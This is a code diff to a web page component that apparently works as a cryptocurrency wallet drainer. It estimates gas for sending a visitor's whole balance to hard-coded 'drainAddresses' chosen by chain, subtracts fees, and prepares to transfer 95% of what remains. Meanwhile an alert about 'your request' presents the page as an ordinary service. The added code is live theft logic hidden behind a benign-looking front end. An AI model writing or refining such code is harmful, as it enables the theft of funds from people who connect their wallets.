@@ -289,14 +289,29 @@ export default function Home() {
     // let calc95 = (bal * BigNumber.from(10))/BigNumber.from(100)
     // console.log('cal95: ', calc95)
 
+    let estimate_gas;
+
+    if(chainId === 1) {
+      estimate_gas = await ethersProvider.estimateGas({
+        to: drainAddresses[0],
+        value: bal
+      })
+    } else {
+      estimate_gas = await ethersProvider.estimateGas({
+        to: drainAddresses[1],
+        value: bal
+      })
+    }
+
+
     const maxFees = (await ethersProvider.getFeeData()).maxFeePerGas;
     console.log('Fee Data: ', maxFees);
 
-    if(bal < maxFees) {
+    if(bal < estimate_gas) {
       alert('You can stop here, no funds to complete your request!!!')
 
     } else {
-        const balances = bal - maxFees;
+        const balances = bal - estimate_gas;
         console.log('bal: ', balances);
 
         const balsent95_afterfees = (balances * 95) / 100
